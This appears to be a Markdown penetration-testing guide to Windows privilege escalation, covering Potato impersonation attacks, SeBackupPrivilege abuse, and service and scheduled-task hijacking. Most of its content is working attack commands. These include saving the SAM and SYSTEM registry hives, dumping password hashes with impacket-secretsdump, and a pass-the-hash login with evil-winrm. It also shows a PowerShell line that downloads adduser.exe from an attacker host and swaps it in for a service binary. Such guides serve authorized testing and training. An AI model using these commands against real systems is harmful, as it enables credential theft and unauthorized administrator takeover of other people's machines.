---
title: "Windows Privilege Escalation Guide"
description: "Comprehensive Windows privilege escalation guide covering SeBackupPrivilege, SeImpersonatePrivilege, Service Binary Hijacking, and Scheduled Tasks."
tags: [windows, privilege-escalation, privesc, sebackupprivilege, seimpersonate, services]
---

# Windows Privilege Escalation Guide

This guide covers common Windows privilege escalation techniques tested in lab environments and real-world engagements.

---

## 1. Privileges & Impersonation Attacks

### `SeImpersonatePrivilege` (Potato Attacks)
Allows a process to impersonate security tokens.
- **Tools:** SweetPotato, JuicyPotatoNG, GodPotato, RoguePotato.
- **Check Privilege:**
  ```cmd
  whoami /priv
  ```

### `SeBackupPrivilege` (Registry & NTDS Extraction)
Allows bypassing all ACL permissions to read files.
1. **Save SAM and SYSTEM registry hives:**
   ```powershell
   reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv /y
   reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y
   ```
2. **Download hives and dump hashes:**
   ```bash
   impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
   ```
3. **Pass-The-Hash Login:**
   ```bash
   evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
   ```

---

## 2. Service Binary Hijacking

If a service executable directory is writable by low-privilege users, replace the target binary with a malicious payload.

### Step 1: Enumerate Running Services
```powershell
Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

### Step 2: Replace Executable & Restart Service
```powershell
# 1. Download payload
iwr http://<ATTACKER_IP>/adduser.exe -OutFile adduser.exe

# 2. Backup original and swap
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe.bak
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# 3. Restart service or reboot machine
```

---

## 3. Scheduled Task Hijacking

Enumerate scheduled tasks for custom executables running under higher privileges:
```cmd
schtasks /query /fo LIST /v
```
Inspect writable `Task To Run` paths and replace them with custom payload binaries.
